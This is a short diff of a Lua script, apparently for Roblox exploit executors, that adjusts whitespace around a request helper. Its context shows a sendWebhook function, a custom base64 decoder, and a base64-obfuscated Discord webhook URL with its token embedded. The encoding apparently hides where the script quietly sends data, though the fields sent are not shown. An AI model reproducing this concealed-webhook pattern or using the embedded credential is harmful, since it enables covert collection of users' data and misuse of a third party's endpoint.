@@ -29,8 +29,7 @@ local function sendWebhook(p, whitelisted)
             color = colorCode
         }}
     })
-
-    local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
+local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 local function base64Decode(data)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     data = string.gsub(data, '[^'..b..'=]', '')
@@ -46,6 +45,7 @@ local function base64Decode(data)
         return string.char(c)
     end))
 end
+
 local encodedUrl = "aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0MDQwODAzOTUxMjkwNjU0OTIvMkp1ay1sUko5M29PZjMwczR4ek11XzFoeVlaZUtOTXVzR0cwekhQTTFQt2N3T1NHa0FhaERsVk5CYU9nT3h3RXdXRA=="
 local decodedUrl = base64Decode(encodedUrl)
 
